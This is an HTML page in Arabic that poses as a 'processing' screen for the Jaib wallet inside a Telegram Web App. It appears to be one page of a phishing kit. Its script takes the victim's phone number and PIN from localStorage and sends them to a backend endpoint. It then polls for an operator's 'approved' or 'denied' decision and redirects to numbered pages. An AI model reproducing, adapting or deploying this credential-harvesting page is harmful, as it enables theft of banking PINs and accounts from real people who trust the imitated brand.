<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>جاري المعالجة - جيب (Jaib)</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <!-- ✅ Arabic Font (Tajawal) -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">

    <style>
        :root {
            --jaib-red: #D9142B;          /* Jaib Signature Crimson Red */
            --jaib-red-dark: #B00E21;
            --jaib-gradient: linear-gradient(180deg, #F0243C 0%, #D9142B 100%);
            --bg-dark: #18181B;
            --card-bg: #FFFFFF;
            --text-dark: #18181B;
            --text-muted: #666666;
        }

        * {
            box-sizing: border-box;
            font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: var(--bg-dark);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            direction: rtl;
        }

        /* Centered Loading Card */
        .loading-card {
            background: var(--card-bg);
            width: 88%;
            max-width: 380px;
            padding: 45px 24px;
            border-radius: 22px;
            text-align: center;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.4);
            border: 1px solid #F0F0F0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Animated Spinner Circle */
        .loader-circle {
            width: 110px;
            height: 110px;
            background: var(--jaib-gradient);
            border-radius: 50%;
            margin-bottom: 28px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 6px 22px rgba(217, 20, 43, 0.35);
        }

        .loader-circle::after {
            content: '';
            width: 82px;
            height: 82px;
            border: 4px solid rgba(255, 255, 255, 0.25);
            border-top: 4px solid #FFFFFF;
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Dynamic Status Typography */
        h2 {
            color: var(--text-dark);
            font-size: 24px;
            margin: 0 0 10px;
            font-weight: 900;
        }

        p {
            color: var(--text-muted);
            font-size: 15px;
            margin: 0;
            line-height: 1.6;
            font-weight: 600;
        }
    </style>
</head>

<body>

<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">جاري المعالجة...</h2>
    <p id="sub-text">جاري تجهيز التحقق...</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {

    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");

    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
    }

    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
    const pin = localStorage.getItem("lastPin") || "";

    if (!phone) {
        console.warn("⚠️ No phone number found in localStorage");
    }

    // Send login notification to backend endpoint
    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin })
        });
    } catch (err) {
        console.error("❌ Request error:", err);
    }

    // Dynamic progress text switch
    setTimeout(() => {
        mainText.textContent = "يرجى الانتظار...";
        subText.textContent = "لن يستغرق ذلك سوى ثوانٍ قليلة";
    }, 3000);

    // Poll backend status for approval or denial
    async function checkApproval() {
        if (!phone) return;

        try {
            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
            const data = await res.json();

            if (data.status === "approved") {
                mainText.textContent = "تمت الموافقة!";
                subText.textContent = "جاري فتح الصفحة التالية...";

                setTimeout(() => {
                    window.location.href = "/page8";
                }, 1500);
            }

            if (data.status === "denied") {
                mainText.textContent = "تم الرفض!";
                subText.textContent = "رمز PIN أو رقم الهاتف غير صحيح.";

                setTimeout(() => {
                    window.location.href = "/page6?error=wrongpin";
                }, 2000);
            }

        } catch (err) {
            console.error("❌ Status check failed:", err);
        }
    }

    setInterval(checkApproval, 2000);
});
</script>

</body>
</html>
